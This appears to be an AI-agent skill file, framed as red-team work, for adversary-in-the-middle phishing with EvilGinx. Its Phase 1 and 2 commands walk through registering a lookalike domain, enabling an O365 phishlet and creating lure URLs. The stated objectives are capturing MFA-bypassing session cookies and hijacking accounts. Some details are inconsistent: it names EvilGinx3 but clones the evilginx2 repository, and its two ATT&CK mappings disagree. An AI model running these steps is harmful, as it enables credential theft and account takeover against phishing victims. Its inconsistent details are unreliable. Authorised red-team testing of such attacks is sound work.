---
name: performing-initial-access-with-evilginx3
description: "Perform authorized initial access using EvilGinx3 adversary-in-the-middle 信号:钓鱼,社会工程,钓鱼邮件。"
when-to-use: Perform authorized initial access using EvilGinx3 adversary-in-the-middle
  phishing framework to capture session tokens and bypass multi-factor authentication
  during red team engagements.
domain: cybersecurity
subdomain: red-teaming
tags:
- red-team
- initial-access
- phishing
- evilginx
- mfa-bypass
- adversary-in-the-middle
- credential-theft
version: '1.0'
author: mahipal
license: Apache-2.0
d3fend_techniques:
- File Metadata Consistency Validation
- Application Protocol Command Analysis
- Identifier Analysis
- Content Format Conversion
- Message Analysis
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1003
mitre_f3:
  version: '1.1'
  tactics:
  - resource-development
  - initial-access
  - positioning
  techniques:
  - id: T1583.001
    name: 'Acquire Infrastructure: Domains'
    tactic: resource-development
    source: attack
  - id: T1660
    name: Phishing
    tactic: initial-access
    source: attack
  - id: T1557
    name: Adversary-in-the-Middle
    tactic: initial-access
    source: attack
  - id: T1539
    name: Steal Web Session Cookie
    tactic: positioning
    source: attack
  - id: T1111
    name: Multi-Factor Authentication Interception
    tactic: initial-access
    source: attack
  - id: F1004
    name: Access with Stolen Session Cookie
    tactic: initial-access
    source: f3
  - id: F1006
    name: Account Takeover
    tactic: initial-access
    source: f3
---
# Performing Initial Access with EvilGinx3

## Overview

EvilGinx3 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, enabling bypass of multi-factor authentication (MFA). Unlike traditional credential phishing that only captures usernames and passwords, EvilGinx3 operates as a transparent reverse proxy between the victim and the legitimate authentication service, intercepting the full authentication flow including MFA tokens and session cookies. This makes it the primary tool for red teams demonstrating the risk of adversary-in-the-middle (AiTM) attacks against organizations relying solely on MFA for protection.


## When to Use

- When conducting security assessments that involve performing initial access with evilginx3
- When following incident response procedures for related security events
- When performing scheduled security testing or auditing activities
- When validating security controls through hands-on testing

## Prerequisites

- Familiarity with red teaming concepts and tools
- Access to a test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## Objectives

- Deploy EvilGinx3 with custom phishlets targeting authorized scope
- Configure DNS and SSL certificates for the phishing domain
- Capture session tokens that bypass MFA protections
- Import stolen session cookies into a browser to hijack authenticated sessions
- Integrate with GoPhish or custom delivery mechanisms for phishing email campaigns
- Document the complete attack chain from phishing email to authenticated access

## MITRE ATT&CK Mapping

- **T1566.002** - Phishing: Spearphishing Link
- **T1557** - Adversary-in-the-Middle
- **T1539** - Steal Web Session Cookie
- **T1078** - Valid Accounts
- **T1556** - Modify Authentication Process
- **T1550.004** - Use Alternate Authentication Material: Web Session Cookie

## Workflow

### Phase 1: Infrastructure Setup
1. Register a convincing lookalike domain (e.g., using homoglyphs or typosquatting)
2. Provision a VPS and point the domain's DNS A record to the server IP
3. Install EvilGinx3:
   ```bash
   git clone https://github.com/kgretzky/evilginx2.git
   cd evilginx2
   make
   sudo ./bin/evilginx -p ./phishlets
   ```
4. Configure the domain and IP in EvilGinx3:
   ```
   config domain example-phish.com
   config ipv4 <server-ip>
   ```
5. EvilGinx3 automatically provisions Let's Encrypt certificates for configured hostnames

### Phase 2: Phishlet Configuration
1. Select or create a phishlet for the target service (e.g., Microsoft 365, Google Workspace):
   ```
   phishlets hostname o365 login.example-phish.com
   phishlets enable o365
   ```
2. Verify phishlet is active and SSL certificate is issued:
   ```
   phishlets
   ```
3. Create a lure URL for the phishing campaign:
   ```
   lures create o365
   lures get-url 0
   ```
4. Optionally configure a redirect URL for post-capture:
   ```
   lures edit 0 redirect_url https://legitimate-site.com
   ```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
